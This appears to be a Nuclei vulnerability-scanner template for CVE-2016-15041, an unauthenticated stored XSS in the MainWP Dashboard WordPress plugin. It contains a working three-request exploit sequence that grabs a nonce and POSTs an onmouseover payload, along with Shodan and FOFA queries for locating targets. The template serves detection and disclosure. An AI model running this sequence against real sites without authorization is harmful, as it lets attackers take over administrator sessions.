id: CVE-2016-15041

info:
  name: MainWP Dashboard <= 3.1.2 - Unauthenticated Stored XSS
  author: flame
  severity: high
  description: |
    MainWP Dashboard plugin for WordPress versions up to 3.1.2 contains a stored cross-site scripting 
    vulnerability due to insufficient input sanitization in the 'mwp_setup_purchase_username' parameter. 
    Unauthenticated attackers can inject arbitrary JavaScript that executes when administrators view 
    the Extensions page. The setup wizard lacks proper authentication checks, allowing anyone to 
    modify extension API credentials which are then rendered without proper HTML entity escaping.
  impact: |
    An unauthenticated attacker can inject malicious scripts that execute in the context of an 
    administrator's session, potentially leading to account takeover, plugin installation, or 
    arbitrary code execution on the WordPress server via the theme/plugin editor.
  remediation: |
    Upgrade MainWP Dashboard to version 3.1.3 or later where proper output escaping was implemented.
  reference:
    - https://klikki.fi/mainwp-admin-panel-unauthenticated-stored-xss/
    - https://nvd.nist.gov/vuln/detail/CVE-2016-15041
    - https://github.com/projectdiscovery/nuclei-templates/issues/14559
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2016-15041
    cwe-id: CWE-79
  metadata:
    verified: true
    max-request: 3
    shodan-query: http.component:"WordPress" http.component:"MainWP"
    fofa-query: body="mainwp" && body="wp-content/plugins"
  tags: cve,cve2016,mainwp,wordpress,xss,stored-xss,wp-plugin

variables:
  randstr: "{{rand_base(8)}}"

http:
  - raw:
      # Step 1: Access setup page to get nonce (no authentication required - this is the bug!)
      - |
        GET /wp-admin/admin-post.php?page=mainwp-setup&step=purchase_extension HTTP/1.1
        Host: {{Hostname}}

      # Step 2: Inject XSS payload using the nonce
      # The payload uses quote to break out of value attribute, then adds event handler
      - |
        POST /wp-admin/admin-post.php?page=mainwp-setup&step=purchase_extension&_wpnonce={{nonce}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        mwp_setup_purchase_username=nuclei{{randstr}}"+onmouseover%3Dalert(1)+x%3D"&mwp_setup_purchase_passwd=test&save_step=1

      # Step 3: Check if payload is stored and reflected in the setup page
      # (The actual XSS triggers on /wp-admin/admin.php?page=Extensions but that requires auth)
      - |
        GET /wp-admin/admin-post.php?page=mainwp-setup&step=purchase_extension HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: nonce
        part: body
        group: 1
        internal: true
        regex:
          - '_wpnonce" value="([a-zA-Z0-9]+)"'

    matchers-condition: and
    matchers:
      # Verify MainWP setup wizard is accessible (plugin installed and active)
      - type: word
        part: body_1
        words:
          - "MainWP"
          - "Setup Wizard"
          - "mwp_setup_purchase_username"
        condition: and

      # Verify our XSS payload is stored and reflected
      # On the setup page, quotes are HTML-encoded (&quot;) but the onmouseover is preserved
      # This proves the unsanitized input is stored and will execute on the Extensions page
      - type: regex
        part: body_3
        regex:
          - 'value="nuclei[a-zA-Z0-9]+.*onmouseover'

      - type: status
        status:
          - 200
